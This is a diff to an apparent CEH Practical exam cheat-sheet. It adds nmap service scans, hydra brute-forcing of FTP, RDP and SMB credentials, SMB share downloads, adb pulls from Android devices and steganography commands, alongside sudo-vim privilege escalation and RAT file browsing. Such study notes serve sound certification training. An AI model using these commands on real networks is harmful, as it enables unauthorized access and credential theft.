@@ -13,9 +13,11 @@ If even this the above command is not working then use this command-  namp -f 10
 9- nmap --script smb-os-discovery -p 445 <DC-IP-Address>
 10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.0/24 to identify the number ofmercury services running
 11- nmap -p 3389 --open -sV 10.10.55.0/24 to Identify a machine with RDP service enabled
-12- nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24  to identify mobile devices
+12- nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24 or nmap -sV -p 5555 192.168.x.x/2x to identify mobile devices
 13- nmap -p 22 --open 10.10.55.0/24  scan for SSh 
-14- nmap -p 139,445 --open -sV 10.10.55.0/24  to identify SMB services 
+14- nmap -p 139,445 --open -sV 10.10.55.0/24 or nmap -T4 -A -p 139,445 192.168.x.x/2x  to identify SMB services 
+15- namp -sV -A -p 80 10.10.1.13/24 or nmap -T4 -A 192.168.x.x/2x or nmap -T4 -A -p 80,443 192.168.x.x/2x to identify server running WampServer.
+16- nmap -p 21 192.x.x.0/24   Identify FTP Service
 ```
 # Enumeration
 ```
@@ -27,20 +29,24 @@ If even this the above command is not working then use this command-  namp -f 10
 5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
-7- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X   Crack RDP Credentials
-8- smbclient -L \\10.10.55.X  to enumerate SMB Client
-9- hydra -L user_list.txt -P password_list.txt 10.10.55.X smb  brute force SMB credentials
-10- smbclient \\\\10.10.55.X\\share_name -U user%password123  Access SMB share
+7- hydra -L username_file -P password_file 192.168.0.x ftp
+ftp 192.168.0.x
+get file
+cat file
+8- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X  Crack RDP Credentials
+9- smbclient -L \\10.10.55.X  to enumerate SMB Client
+10- hydra -L user_list.txt -P password_list.txt 10.10.55.X smb  brute force SMB credentials
+11- smbclient \\\\10.10.55.X\\share_name -U user%password123 or smbclient //target_ip/ -U USER_NAME or smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt'  Access SMB share
 get Sniffer.txt
 cat Sniffer.txt
-11- ssh marcus@10.10.55.X
+12- ssh marcus@10.10.55.X
 sudo -l
 sudo -i
 sudo vim
 find / -name "imroot.txt" 2>/dev/null
 cd /
 cat imroot.txt
-12- Thief RAT -> Connect to 10.10.55.X -> Authenticate
+13- Thief RAT -> Connect to 10.10.55.X -> Authenticate
 Thief RAT -> File Manager -> Navigate to C:\Users\Username\Documents
 Thief RAT -> File Manager -> Open folder -> Count files
 ```
@@ -51,6 +57,7 @@ Thief RAT -> File Manager -> Open folder -> Count files
 3- Image Stegnography using Openstego- PRACTICE ??
 4- shCopy code
    john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt
+5- snow.exe -C -p “password” file.txt
 ```
 #  Sniffing
 ```
@@ -149,7 +156,7 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 5- adb connect 10.10.55.X:5555
 6- adb shell
 7- find /sdcard/ -name "*.jpg" -o -name "*.png"
-8- adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
+8- adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg or adb pull /sdcard/scan
 9- steghide extract -sf ceh.jpg
 10- cat hidden.txt
 ```
@@ -180,3 +187,13 @@ aircrack-ng -b <bssid from wireshark> -w <path to word list> <pathto pcap file>
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
+#  Useful Links 
+```
+1. https://github.com/3ls3if/Cybersecurity-Notes/tree/main/readme/ceh-engage-walkthrough
+2. https://ceh-practical.cavementech.com/module-6.-system-hacking/2.-privilege-escalation
+3. https://hackmd.io/@vNeOEzglRpyGwr4-inKPuw/SymDcjKcC
+4. https://hackmd.io/@vNeOEzglRpyGwr4-inKPuw/ryAP5sKcC
+5. https://hackmd.io/@vNeOEzglRpyGwr4-inKPuw/H1dd5sYqR
+6. https://github.com/System-CTL/CEH_CHEAT_SHEET
+7. https://github.com/3ls3if/Cybersecurity-Notes/tree/main/readme/ceh-practical
+8. https://github.com/cmuppin/CEH
